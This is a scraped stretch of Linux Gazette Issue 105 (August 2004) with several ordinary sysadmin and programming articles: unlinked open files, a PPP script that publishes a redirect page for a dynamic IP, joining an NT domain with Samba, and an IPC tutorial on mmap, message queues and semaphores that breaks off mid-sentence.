<pre class="code">
     rm /var/log/messages
     touch /var/log/messages
</pre>

<p> to reclaim the space, but the used space doesn't reappear? This is because,
although you've deleted the filename part, there's a process that's got the
data part open still (syslogd), and the OS won't release the space for the
data until the process closes it. In order to complete your space
reclamation, you have to
<pre class="code">
     kill -SIGHUP `cat /var/run/syslogd.pid`
</pre>

<p>to get syslogd to close and reopen the file.

<p> You can use this to your advantage in programs: have you ever wondered how
you could <u>hide</u> a temporary file? Well, you could do the following:
  
<pre class="code">
     {
        FILE *fp;

        fp = fopen("some.hidden.file","w");
        unlink("some.hidden.file"); /* deletes the filename part */

        /* some.hidden.file no longer has a filename and is truely hidden */
        fprintf(fp,"This data won't be found\n"); /* access the data part */
        /*etc*/
        fclose(fp); /* finally release the data part */
     }
</pre>

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<p>
<img align="left" alt="[BIO]" src="../gx/2002/note.png" class="bio">

<!-- 
If the author has sent his pic, save it to the right directory
and enable the line below.

<img align="left" alt="[BIO]" src="../gx/authors/pic.jpg" class="bio">

-->

<em>

<! -- BIO GOES HERE -->

Canadian by birth, and living in Brampton, Ontario, I am a career techie
working at a major Canadian bank. For over 25 years, I've programmed on
all sorts of systems, from Z80 CP/M up to OS/390. Primarily, I develop
OS/390 MVS applications for banking services, and have incorporated
Linux into my development environment.

</em>
<br clear="all">
<!-- *** END bio *** -->



<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/pitcher.html">Lew Pitcher</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="pitcher1"></a>
<h1>Dude, Where's my System?</h1>
<p id="by"><b>By <A HREF="../authors/pitcher.html">Lew Pitcher</A></b></p>


</b>
</p>


<p>
<p>Recently, I changed over to an "always on" ADSL<sup>[<a name=
"back_1" href="#footnote_1">1</a>]</sup> connection from an
"on-demand" dialup one, and I now have an opportunity to host a
number of internet services from my home server. The one problem I
have is that, while my internet is "always on", my ISP occasionally
renegotiates the IP address of my ADSL connection, making my
internet services difficult to find. Up until now, I've played
"hide and seek" with my server, searching for it among a multitude
of alternate addresses each time my ISP changes the address.</p>

<p>Now, I <em>could</em> spend a bit of money to lease my own
domain name, and subscribe to one of those 'dynamic DNS' services
that let you point your domain name at an ever-changing IP address,
but I don't need a permanent domain name right now, and I've got other
options.</p>

<p>My ISP provides web site hosting for their subscribers, with the
usual upload and download volume caps to discourage extensive web
hosting. I don't need their host for my content, but it
<em>does</em> make a handy 'rendezvous' site to gain access to my
system. All I have to do is arrange for my PPPoE<sup>[<a name=
"back_2" href="#footnote_2">2</a>]</sup> client<sup>[<a
name="back_3" href="#footnote_3">3</a>]</sup> to rewrite my
personal web page on my ISP's server every time my ISP gives me a
new IP address. If PPPoE can populate that web page with my
system's new IP address, I'll always be able to find my system from
the outside by looking at my webpage on my ISP's server.</p>

<p>Simple, yes?</p>

<h3>Simple, yes!</h3>

<p>The first thing I needed to do was to arrange for my PPPoE
client to be able to pass each new IP address on to something that
would update my external webpage.</p>

<p>To do this, I modified my <b><tt>/etc/ppp/ip-up</tt></b><sup>[<a
name="back_4" href="#footnote_4">4</a>]</sup> script to
execute a new script (<b><tt>/etc/ppp/ip-up.webpage</tt></b>),
passing it the PPP 'local' address assigned by my ISP to my end of
my PPPoE ADSL connection. The <b><tt>/etc/ppp/ip-up</tt></b> script
would then write the webpage and get it to my ISP.</p>

<p>This was a simple change (a literal 'one-liner') in
<b><tt>/etc/ppp/ip-up</tt></b></p>

<blockquote>
<pre>
#!/bin/sh
#
# ip-up interface-name tty-device speed local-IP remote-IP ipparm
#       $1             $2         $3    $4       $5        $6
#
# (NB: ipparm is string from ipparm parameter in pppd options)
#
# This file /etc/ppp/ip-up is run by pppd when there's a
# successful ppp connection.
#
# The environment is cleared before executing this script
# so the path must be reset.
#
PATH=/usr/bin:/usr/sbin:/usr/local/bin:/sbin:/bin
export PATH
#
umask 033
echo "$4" &gt;/var/run/$1.ip
#
<font color="green">#
# Build redirect webpage, put it on ISP's webserver
<b>/etc/ppp/ip-up.webpage "$4"</b>
#</font>
/usr/bin/logger -i -t /etc/ppp/ip-up "$1 [$4] connected to ISP [$5]"
# Done...
</pre>
</blockquote>

<h3>The Harder Part</h3>

<p>Now that I had arranged for my PPPoE client to run a script, I
had to build the script it would run. The script would have to
build an HTML document that would redirect the reader to my
server's IP address, and FTP that document to my ISP's web server.
It would have to preserve the internal security of my system by
refraining from exposing my ISP userid and password to local users,
and should do this with simple tools and a minimum of
programming.</p>

<p>The security aspects were satisfied by making the script
'execute only'<sup>[<a name="back_5" href=
"#footnote_5">5</a>]</sup>, so no local user could read it's
contents, and by ensuring that no password was exposed to
<tt>ps(1)</tt><sup>[<a name="back_6" href=
"#footnote_6">6</a>,<a name="back_7" href=
"#footnote_7">7</a>]</sup> as a command line argument. The HTML
was built through a simple "here document"<sup>[<a name="back_8"
href="#footnote_8">8</a>]</sup> fed into a
<tt>cat(1)</tt><sup>[<a name="back_9" href=
"#footnote_9">9</a>]</sup> command that created a temporary
file of HTML. The new IP address was written into the HTML through
the shell variable substitution process that occurs with "here
document" processing. Finally, the temporary file was transmitted
to my ISP using a command line <tt>ftp(1)</tt><sup>[<a name=
"back_10" href="#footnote_10">10</a>]</sup> command, with
<em>its</em> parameters all passed through another "here document".
This second "here document" permitted me to pass the user name and
password into the FTP client without exposing them on a command
line.</p>

<p>The <a href=
"misc/pitcher/ip-up.webpage.txt"><b><tt>/etc/ppp/ip-up.webpage</tt></b></a>
script (below) is primitive and not very elegant, but it gets the
job done.</p>

<blockquote>
<pre>
#!/bin/bash

# Validate that we get 1 and only 1 parameter
case $# in
  1) ;;
  *) /usr/bin/echo Usage: $0 ip-address-or-dns-name
     exit 1 ;;
esac
# the $1 parameter is the IP address assigned to our system

# Establish today's date (for html)
DATE=`/usr/bin/date`

# allocate empty tempfile, terminate if unable to allocate
TEMPFILE=`/usr/bin/mktemp /tmp/$1=XXXXXX` || exit 2

# build webpage (redirect) html into tempfile
# NB: $1 is our local IP address, passed in from ip-up
#     $DATE is the current date and time
#     With the "here document", these variables will
#     be substituted into the stream by the shell
/usr/bin/cat &gt;$TEMPFILE &lt;&lt;END
&lt;html&gt;
&lt;head&gt;
&lt;!-- $DATE --&gt;
&lt;meta http-equiv="refresh" content="0;url=http://$1/"&gt;;
&lt;/head&gt;
&lt;/html&gt;
END

# send webpage (redirect html) to webserver
#  ISP_ADDRESS is FTP address of ISP's web server
#  ISP_USERID  is my userid at ISP's FTP server
#  ISP_PASSWD  is my password at ISP's FTP server
#  NB: ISP_USERID, ISP_PASSWD set as local environment
#      vars so that they don't appear as parameters
#      in local 'ps ax' listings
#      With the "here document", these variables will
#      be substituted into the stream by the shell
ISP_ADDRESS=webserver.isp.com
ISP_USERID=username
ISP_PASSWD=password

/bin/ftp -n &lt;&lt;STOP
open $ISP_ADDRESS
user $ISP_USERID $ISP_PASSWD
ascii
put $TEMPFILE index.htm
bye
STOP

# delete tempfile
/bin/rm -f $TEMPFILE

# terminate
exit 0
</pre>
</blockquote>

<h3>Olly-olly, Outs in free!</h3>

<p>Now, when my ISP changes my IP address, my PPPoE server invokes
<b><tt>/etc/ppp/ip-up</tt></b>, giving it my new IP address. This
script invokes my <b><tt>/etc/ppp/ip-up.webpage</tt></b> script,
which builds and installs a redirect webpage at my ISP's webserver
that points at my new IP address. All <em>I</em> have to do is
browse a specific web page on my ISP's webserver, and I'll be
redirected to my webpage on my server.</p>

<p>So, with a little scripting, and the resident automation in my
Linux system, I've now got a way to find my server from the
outside, no matter which IP address my ISP gives it. I guess you
could say that my server has given up the game of "hide and seek",
and is playing other games now.</p>

<hr>
<h4>Footnotes</h4>

<dl>
<dt><b>[<a name="footnote_1" href="#back_1">1</a>] -
ADSL</b></dt>

<dd>ADSL (or "Asymmetrical Digital Subscriber Line") is a
technology that permits an ISP to offer high speed internet
connectivity over regular phone lines <em>without</em> impacting
the regular use of the phone line. In other words, I can surf the
internet <em>while</em> my wife chats with her friends over the
phone.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_2" href="#back_2">2</a>] -
PPPoE</b></dt>

<dd>PPPoE (or "PPP over Ethernet") is a low level protocol that
some ISPs use to deliver TCP/IP connectivity on ADSL lines. Since
PPPoE uses PPP (the regular 'dial up' services) to manage the ADSL
connection, all the PPP facilities and management tools work with a
PPPoE-enabled ADSL line. This includes things like the
<tt>/etc/ppp/ip-up</tt> script.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_3" href="#back_3">3</a>] - my
PPPoE client</b></dt>

<dd>is the "Roaring Penguin" PPPoE daemon that can be found at <a
href=
"http://www.roaringpenguin.com/penguin/open_source_rp-pppoe.php">http://www.roaringpenguin.com/penguin/open_source_rp-pppoe.php</a>.
In the Slackware 9.0 Linux distribution that I run, the Roaring
Penguin PPPoE daemon is contained in the
<tt>rp-pppoe-3.5-i386-1.tgz</tt> package. However, to use this
PPPoE daemon, you also need a PPP daemon; Slackware 9.0 uses the
ANU PPP daemon found at <a href=
"ftp://cs.anu.edu.au/pub/software/ppp/">ftp://cs.anu.edu.au/pub/software/ppp/</a>,
and in Slackware package <tt>ppp-2.4.1-i386-2.tgz</tt>.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_4" href="#back_4">4</a>] -
<tt>/etc/ppp/ip-up</tt></b></dt>

<dd>The <tt>/etc/ppp/ip-up</tt> script is executed by the PPP
daemon when ever it establishes a TCP/IP environment over the PPP
link. Several parameters are given to the <tt>ip-up</tt> script,
including the IP address assigned to our end of the PPP connection.
I use this script to trigger the construction of the web page that
gets placed on my ISP's server, and I use the supplied IP address
in the contents of the web page.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_5" href="#back_5">5</a>] -
"execute only"</b></dt>

<dd>Scripts, like other executable files, can be set to be
executable without being readable by using a
"<tt>chmod&nbsp;ug=x&nbsp;<em>scriptname</em></tt>" command. I want
this because I don't want users on my system to be able to snoop
through the text of the script to find my logon and password.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_6" href="#back_6">6</a>] -
<tt><em>xx(y)</em></tt> notation</b></dt>

<dd>Ancient Unix notation that indicates the documentation for
topic <b><em>xx</em></b> can be found in section <b><em>y</em></b>
of the printed or online manual. Most Linux users can read this
documentation using the "<tt>man <em>y xx</em></tt>" syntax from
the command line, as in "<tt>man 1 ps</tt>".</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_7" href="#back_7">7</a>] -
<tt>ps(1)</tt></b></dt>

<dd><tt>ps</tt> lists the particulars of all running processes. If
given the correct options, it will show the entire command line
used to invoke the process. I avoid placing userids and passwords
into command lines as someone could snoop them out by running
<tt>ps</tt> at the proper moment. Call me paranoid, but even
paranoids have enemies. ;-)</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_8" href="#back_8">8</a>] - "here
document"</b></dt>

<dd>A "here document" is a special form of redirection that routes
text embedded in a script directly into a program's input. The
shell can perform parameter expansion, command substitution, and
arithmetic substitution on the contents of the "here document"
before the resulting text is given to the program. This makes "here
documents" ideal for my use, because I can have the shell customize
the text as necessary without depending on complex editor
commands.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_9" href="#back_9">9</a>] -
<tt>cat(1)</tt></b></dt>

<dd><tt>cat</tt> is a utility that con<em>cat</em>enates files
together, and outputs the resulting file to stdout. If no input
files are named, <tt>cat</tt> will read it's input from stdin. This
feature makes <tt>cat</tt> a handy, but dumb, text editor, and
that's how I use it here.</dd>

<dd><br></dd>
<dt><b>[<a name="footnote_10" href="#back_10">10</a>] -
<tt>ftp(1)</tt></b></dt>

<dd>The command line FTP client works in this environment, but it
would have been better if it had some scripting ability. I use a
"here document" to pass in the FTP commands, so as to avoid
exposing my ISP access password on the command line. However, with
the "here document" approach, the <tt>ftp(1)</tt> client won't
abort the interaction if an FTP command goes wrong, and there is no
way to detect or act on a command failure from within the "here
document". So, I take a chance that the FTP script will work each
and every time without fail.</dd>
</dl>

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<p>
<img align="left" alt="[BIO]" src="../gx/2002/note.png" class="bio">

<!-- 
If the author has sent his pic, save it to the right directory
and enable the line below.

<img align="left" alt="[BIO]" src="../gx/authors/pic.jpg" class="bio">

-->

<em>

<! -- BIO GOES HERE -->

Canadian by birth, and living in Brampton, Ontario, I am a career techie
working at a major Canadian bank. For over 25 years, I've programmed on
all sorts of systems, from Z80 CP/M up to OS/390. Primarily, I develop
OS/390 MVS applications for banking services, and have incorporated
Linux into my development environment.

</em>
<br clear="all">
<!-- *** END bio *** -->



<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/pitcher.html">Lew Pitcher</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="price"></a>
<h1>Using Samba to join a Windows NT domain</h1>
<p id="by"><b>By <A HREF="../authors/price.html">Rich Price</A></b></p>


</b>
</p>


<p>
<p> I originally wrote this procedure for use at my place of work.  We
have a number of Windows domains [NT style, not active directory] and I
often need to have a Linux machine join one of them.  This procedure was
developed on a box running Fedora Core 1; however, with simple
modifications (namely, stopping the Samba services manually by invoking the
appropriate script in "/etc/init.d" with the "stop" option), this should
also work for other distributions.

<h3>
Assumptions
</h3>

<ul>
<li>You have administrative access to the domain.
<li>You have root access to the Linux server.
<li>You have access to a GUI on the Linux server [Fedora only.]
</ul>

<h3>
Getting Started
</h3>

<p>
Use the GUI "Services" tool [Which is Main Menu, System Settings, Server
Settings, Services in Fedora] to shut down the samba daemons [smbd and
nmbd] if they are running on the server.  

<h3>
The smb.conf File
</h3>

<p>
Next edit the /etc/samba/sbm.conf file and replace the [global] section with:

<pre class="code">
[global]
   workgroup = {domain}
   server string =  {server name}

   log file = /var/log/samba/%m.log
   max log size = 50

   security = domain
   password server = [name of a PDC or BDC for {domain}]
   encrypt passwords = yes
   smb passwd file = /etc/samba/private/smbpasswd

   local master = no
   wins server =  {wins server}
   dns proxy = no
</pre>

<p>
Where:<br>
{domain} is the name of the domain.<br>
{server name} is the name of this Linux server.<br>
{wins server} is the IP address of a local WINS server.

<p>
At this point you can make any other changes or adds that you want to other sections of this file.

<h3>
The smbpasswd File
</h3>

<p>
For security reasons we will place the smbpasswd file in a private directory using the following commands:

<pre>
cd /etc/samba
mkdir private
cd private
touch smbpasswd
chmod 600 smbpasswd
cd ..
chmod 500 private
</pre>

<p>
Now we will add a dummy entry to the smbpasswd file.  To do this, first create a user account for yourself on the Linux server [unless one already exists], then execute the following commands:

<pre>
cd /etc/samba/private
cat /etc/passwd | mksmbpasswd.sh  &gt; smbpasswd
</pre>

<p>
Finally, edit the smbpasswd file and remove all lines except those for your user account.

<h3>
Joining the Domain
</h3>

<p>
To add the Linux server to the domain use the following command: 

<pre>
net rpc join member -U {administrator}
</pre>

<p>
Where {administrator} is the user id of a domain administrator for {domain}.  
You may be prompted for the administrator's password at this time.

<h3>
Cleaning Up
</h3>

<p>
Use the "Services" tool [Which is Main Menu, System Settings, Server
Settings, Services in Fedora] to start the samba daemons.

<p>
Then use the "Services" tool [Which is Main Menu, System Settings, Server
Settings, Services in Fedora] to enable the Samba service for all of the
appropriate run levels.

<ol>
<li> Select the smb service and enable it for run level 5.
<li> Save changes.
<li> Select the smb service and enable it for run level 4.
<li> Save changes.
<li> Select the smb service and enable it for run level 3.
<li> Save changes and exit services window.
</ol>

Of course there are other ways to modify run levels depending on the
distribution. If anyone has examples of doing this in other distributions I
would be happy to have them added here.

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2002/note.png" class="bio">
<em>
Rich Price has been using computers for around 35 years and Linux
for around 10 years.  And he hasn't got tired of either quite yet.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/price.html">Rich Price</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="ramankutty"></a>
<h1>Inter-Process Communication - Part II</h1>
<p id="by"><b>By <A HREF="../authors/ramankutty.html">Hiran Ramankutty</A></b></p>


</b>
</p>


<p>
<p>
I hope everyone enjoyed <a href="../104/ramankutty.html">Part I</a> of this
article, where we had an introductory discussion of IPC mechanisms and then
continued with detailed descriptions of mechanisms such as
<strong>pipes</strong>, <strong>fifos</strong> and <strong>shared
memory</strong>. We shall now continue with the other IPC mechanisms such as
<strong>memory mapping</strong>, <strong>semaphores</strong>,
<strong>message queues</strong>, and <strong>sockets</strong>. 

<h3><strong>Memory Mapping</strong></h3>
<p>
We have seen that <strong>fifos</strong> are basically named
<strong>pipes</strong>. Similarly, <strong>mapped memory</strong> is like
<strong>shared memory</strong> with a name. With this little bit of
information, we can conclude that there is some sort of relationship
between files in the file system and <strong>memory mapping</strong>
techniques - and, in fact, there is. Simply put, the <strong>memory
mapping</strong> mechanism deals with the mapping of a file in the file
system to a portion of memory. 

<p>
Say, for example, we have a file that contains some data in a specific
format that the user knows. That file may be required by some application.
We will have to write some parsing function for the application that will
search specific data in the file. To be more specific, we will have the
parsing function return some data to the application whenever any requests
for specific data come from the application. Then, our parsing function
will have to access the file for every request. 

<p>
This is only acceptable if the application makes requests for data a few times.
But this is time-consuming when the application sends frequent requests 
for data and processing. One may wonder what makes it time-consuming.

<p>
Let us look at the operations involved in reading data from a file in
the file system in the hard drive. The major operations involved are as
follows:
<ol type=i>
<li>invoking system calls like <em>open, read, write</em> and <em>close</em>, and 
<li>I/O operations by accessing a device (the hard drive). 
</ol>

<p>
The two operations mentioned above consume considerable system services as
compared to simply reading the data from memory. A program working in
user space, when invoking a system call, transfers control from the user
program to the kernel, which places it in the kernel space. That is, kernel
space is consumed in the execution of the system calls. Also, accessing the
disk (hard drive) frequently will be comparatively slow, since it requires
I/O operations on a physical device. 

<p>
The overhead caused by frequently invoking system calls and accessing 
disk to obtain data can be avoided by the <strong>memory
mapping</strong> technique, which involves logically associating the file
with a portion of the virtual memory or the program's user space. Any file
I/O operations can then be replaced with simple memory access.

<p>
Linux provides system calls such as <strong>mmap</strong> and
<strong>munmap</strong> for the purpose of using the memory mapping
mechanism, which allows the sharing of mapped files. We have to associate the 
file in such a manner that the mapping is accessible to any process. We may
have an application or a program running several processes, and one or more
of the processes may access data from one or more files. So if we have a
mapping for a file with sharing rights for any process, we can use the same
mapping in all processes. See the manual page for <strong>mmap</strong> for
more details.

<p>
Again, synchronization problems can arise. Will the reads happen before or
after the writes?  An entirely unrelated process might have memory-mapped
the file and might be modifying it, unknown to us, at the same time as our
process. A number of problems may come from the design of the
application and the usage of the mechanism as well. So, let's take a look
at the proper usage of this mechanism.

(See <a href="misc/ramankutty/listing1.c.txt">listing1.c.txt</a>)

<p>
The logic behind the program is simple. The code first creates a temporary
file with name <em>test_file</em> and writes the string
<strong>HELLO_STR</strong> (defined as macro) into the file.  We then map
the file <em>test_file</em> to memory using <strong>mmap</strong>. The
format for this call, as described in the manual page for
<strong>mmap</strong> is <code>void * mmap(void *start, size_t length, int
prot, int flags, int fd, off_t offset)</code>.  The first field, which
specifies the starting address, is usually given as '0'. Of course, the
starting address of the memory location from which <strong>length</strong>
bytes (second field) of the file are mapped is non-zero. Instead,
<strong>mmap</strong> returns the starting address. The third argument is
the protection that is to be provided to the mapped memory region. This
should be same as the mode with which the file was opened.  We have given
here <strong>PROT_READ</strong>, which gives read permissions to the memory
page to which mapping has been done; the various memory protection options
are further detailed in the above man page. The fourth argument is a flag
which specifies the type of the mapped object. The flag
<strong>MAP_FLAG</strong> specifies that the mapping is for a regular file
or a character special device file. The fifth argument is a valid file
descriptor of the file to be mapped, and the sixth argument is the
<strong>offset</strong>, which has to be a multiple of the page size as
returned by <strong>getpagesize()</strong> (see manual page for details) or
is the starting offset for the file. A zero as the sixth argument means
that the starting offset for reading the file is zero (i.e., the file is to
be read starting from byte 0.) One notable point in the
<strong>mmap</strong> man page is that the memory mapped using
<strong>mmap</strong> is preserved across <strong>fork</strong> calls with
the same attributes. This feature can be useful when we have more than one
process accessing some file regularly. 

<p>
So, just how much benefit do we gain from memory mapping versus reading a
file? We can demonstrate the gains by comparing this program against the
use of the <strong>open, read</strong> and <strong>close</strong> calls
that we mentioned above.

(See <a href="misc/ramankutty/listing2.c.txt">listing2.c.txt</a>)

<p>
This program gives the output in the same format as the previous one. One
can compare the performance of both the programs by running their
respective executables with the <strong>time</strong> command, that is, if
<em>test1</em> is the executable for <em>listing1.c</em> then run the
program as <strong>time ./test1</strong>. Do the same for
<em>listing2.c</em>. Note the difference between the performance of the two
programs. My Pentium III machine with a processor speed of 733MHz and a
128MB SD RAM showed following results:
<pre>
#Time for listing1.c
real    0m20.360s
user    0m1.600s
sys     0m18.670s
</pre>
<p>
and
<pre>
#Time for listing2.c
real    0m24.325s
user    0m1.990s
sys     0m22.300s
</pre>

<p>
It is obvious that the results may vary from machine to machine. It is also
possible that a machine with a similar configuration like that of my test
machine gives different results. One can also do the testing with different
values of <strong>NTHLOOP</strong>, which will help you to get a better
understanding of the difference in performance as the number of accesses to
a file increases.

<p>
What I have shown here is a very simple scenario. In practical cases, we
will often deal with files that are larger in size and have more and more
complex data. The efficiency of the mapping method becomes much more
apparent as files sizes go up and the complexity of parsing increases.

<p>
One thing to note is that when the process terminates the mapped region is
automatically unmapped. Closing the file descriptor does not unmap the
region automatically. To unmap a memory region we can use the system call
<strong>munmap</strong>.  The address and the offset are the two arguments
needed to unmap a memory region. 

<p>
Experimenting with the third and the fourth arguments to
<strong>mmap</strong> can be very useful, and will promote a deeper
understanding of where the use of <strong>memory mapping</strong> mechanism
will be most effective.

<h3>Message Queues</h3>
<p>
Message queues are one of the three different types of System V IPC
mechanisms. This mechanism enables processes to send information to each
other asynchronously. The word <em>asynchronous</em> in the present context
signifies that the sender process continues with its execution without
waiting for the receiver to receive or acknowledge the information. On the
other side, the receiver does not wait if no messages are there in the
queue. The queue being referred to here is the queue implemented and
maintained by the kernel. 

<p>
Let us now take a look at the system calls associated with this mechanism. 
<ol type=a>
<li>msgget: This, in a way similar to <strong>shmget</strong>, gets a
message queue identifier. The format is 
<pre>
int msgget(ket_t key, int msgflg);
</pre>
The first argument is a unique <strong>key</strong>, which can be generated
by using <strong>ftok</strong> algorithm.  The second argument is the flag
which can be <strong>IPC_CREAT</strong>, <strong>IPC_PRIVATE</strong>, or
one of the other valid possibilities (see the man page); the permissions
(read and/or write) are logically ORed with the flags.
<strong>msgget</strong> returns an identifier associated with the
<strong>key</strong>. This identifier can be used for further processing of
the message queue associated with the identifier.
<li>msgctl: This controls the operations on the message queue. The format is 
<pre>
int msgctl(int msqid, int cmd, struct msqid_ds *buf);
</pre>
Here <strong>msqid</strong> is the message queue identifier returned by
<strong>msgget</strong>. The second argument is <strong>cmd</strong>, which
indicates which action is to be taken on the message queue.  The third
argument is a buffer of type <strong>struct msqid_ds</strong>. Each message
queue has this structure associated with it; it is composed of records for
queues to be identified by the kernel. This structure also defines the
current status of the message queue. If one of the <strong>cmd</strong>s is
<strong>IPC_SET</strong>, some fields in the <strong>msqid_ds</strong>
structure (pointed by the third argument) will be set to the specified
values. See the man page for the details. 
<li>msgsnd: This is for sending messages. The format is 
<pre>
int msgsnd(int msqid, struct msgbuf *msgp, size_t msgsz, int msgflg);
</pre>
The first argument is the message queue identifier returned by
<strong>msgget</strong>. The second argument is a structure that the
calling process allocates. A call to <strong>msgsnd</strong> appends a copy
of the message pointed to by <strong>msgp</strong> to the message queue
identified by <strong>msqid</strong>. The third argument is the size of the
message text within the <strong>msgbuf</strong> structure. The fourth
argument is the flag that specify one of several actions to be taken as
and when a specific situation arises.
<li>msgrcv: This is for receiving messages. The format is 
<pre>
ssize_t  msgrcv(int msqid, struct msgbuf *msgp, size_t msgsz, long msgtyp, int msgflg);
</pre>
Besides the four arguments mentioned above for <strong>msgsnd</strong>,
we also have <strong>msgtyp</strong>, which specifies the type of message
requested. See the man page for the options.
</ol>

<p>
Let's take a look at an example of using message queues.

(See <a href="misc/ramankutty/send.c.txt">send.c.txt</a>)

<p>
First, we create a message queue using <strong>msgget</strong> with the
flag set to <strong>IPC_CREAT</strong> and permissions set to read/write.
Once we get the message queue identifier, we send the messages that in the
above code are read from standard input. <cite>Note the output of the command
<strong>ipcs</strong> before and after running the above program.  Try to
interpret the output. One command that will be of use in doing this is
<strong>ipcrm</strong>; see its man page for more details.</cite>

<p>
The code for receiving the sent messages is given below.

(See <a href="misc/ramankutty/recv.c.txt">recv.c.txt</a>)

<p>
Note that here we are using <strong>msgget</strong> without the field
<strong>IPC_CREAT</strong>. This is because we have not destroyed the
message queue associated with the key <strong>9999</strong>. This can be
seen in <a href="misc/ramankutty/send.c">send.c</a>. When we call
<strong>msgrcv</strong>, we get the messages that were typed into
the <strong>send</strong> program. This is confirmed by writing the
received messages to the standard output.

<p> Experimenting with message queues can be fun, but you have to realize
their limitations.  Only repeated experimentation with this mechanism will
enable one to actually learn it. Using message queues in applications has
to be done only after careful consideration. Before thinking more on this,
let us move on to the last of the System V IPC mechanisms, the
<strong>Semaphores</strong>.

<h3><strong>Semaphores</strong></h3>
<p>
A <strong>semaphore</strong> is best defined as a synchronization variable
among processes communicating with each other. The processes may
communicate data among themselves, or it may be communicated by a shared
data object. The application should then see that the shared data object is
not being written simultaneously by two or more process. A simple solution
will be to have a locking mechanism that will prevent simultaneous changes in
the shared data object. To be more precise, if we have a semaphore variable
- say, <strong>S</strong> - then give a process access to the shared data
object if <strong>S</strong> is not set. Once access is granted, 
<strong>S</strong> is set, and is reset once operations on the shared
data object are over.

<p>
The setting and resetting of the semaphore variable are commonly known as
<strong>wait</strong> and <strong>post</strong> operations. The pseudo code
for the <strong>wait</strong> and <strong>post</strong> operations are
given below:
<pre>
wait(S) {
	while(S &lt;= 0) 
		; /* some operations. */
	S--;
}


post(S) {
	S++;
}
</pre>

<p>
Linux provides three system calls that enable the use of the semaphore
mechanism. 
<ol type=i>
<li>semget: Counterpart of shmget and msgget, the format is 
<pre>
int semget(key_t key, int nsems, int semflg);
</pre>
This returns a semaphore identifier for a set of <strong>nsems</strong>
number of semaphores for a set, associated with the <strong>key</strong>
where <strong>semflg</strong> determines permissions and action to be 
taken (like IPC_CREAT etc.)
<li>semop: This is for controlling operations on the semaphore. The format is 
<pre>
int semop(int semid, struct sembuf *sops, unsigned nsops);
</pre>
The <strong>semid</strong> is an identifier that points to the semaphore
set. The second field is a structure that describes the operations. The
structure as defined in /usr/include/sys/sem.h is:
<pre>
struct sembuf {
	unsigned short int sem_num;   /* semaphore number */
	short int sem_op;             /* semaphore operation */
	short int sem_flg;            /* operation flag */
};
</pre>
The third argument <strong>nsops</strong> is the index in the array pointed
to by <strong>sops</strong>. It is set to 1 if there is one semaphore in
the complete set.  
<li>semctl: Counterpart of shmctl and msgctl, the format is
<pre>
int semctl(int semid, int semnum, int cmd, ...);
</pre>
This is the administrator of the semaphore set. It performs operations
specified by <strong>cmd</strong> on the n<sup>th</sup> semaphore where n
is same as <strong>semnum</strong> and the semaphore set is identified by
<strong>semid</strong>.
</ol>

(See <a href="misc/ramankutty/semaphore.c.txt">semaphore.c.txt</a>)

<p>
If you take a look at the 'keyboard-hit' program that I used 
in my <a href="../104/ramankutty.html">previous article</a> to explain the
use of <strong>pipes</strong>, <strong>fifos</strong> and <strong>shared
memory</strong> mechanisms, the code above is essentially the same. We
accept input from the keyboard and check whether the input is a digit
between 0 and 9 inclusive; however, we now have two processes trying to
take inputs from the keyboard. Since this can lead to conflict, we keep a
lock, so that when one process is active, the other one waits.

<p>
First, we register a signal <strong>SIGINT</strong>, so that whenever the
signal is raised, the signal handler <strong>process_exit</strong> is
executed, bringing about the termination of the process for which the
signal is registered. We then have <strong>init_semaphore</strong>, which
creates a semaphore set with <strong>NUM</strong> members in the set (here
it is 1). On successful creation of the semaphore set,
<strong>semget</strong> returns a semaphore set identifier, which will be
used for further operations on the semaphore set. We then invoke
<strong>set_sem_val</strong>. Initially, this may seem useless, but it can
actually be used to confirm that you can run your program with the code
above and with the code that does not call <strong>set_sem_val</strong>.
The manual page for <strong>semctl</strong> gives a brief description on
the union <strong>semun</strong>. The union as defined is 
<pre>
union semun {
	int val;                  /* value for SETVAL */
	struct semid_ds *buf;     /* buffer for IPC_STAT, IPC_SET */
	unsigned short int *array;    /* array for GETALL, SETALL */
	struct seminfo *__buf;    /* buffer for IPC_INFO */
};
</pre>

<p> We set the field <em>val</em> in the union to 1. This signifies that
access to the critical resource can be provided only once (or one process).
It the value is set as 2, then only two process can hold access to the
shared resource at a time. 

<p>
Next, we initialize two processes that take the same action. We fork it in
such a manner that only the child processes run. If semaphore operation for
the lock is successful, then we invoke <strong>critical_resource</strong>;
otherwise we try again (much like an infinite loop). If a lock is
successful, then that process is provided access to
<strong>critical_resource</strong>. Once it comes out of the
<strong>critical_resource</strong>, we remove the lock.

<cite>Note that we have a <strong>sleep(1)</strong> in the process, which
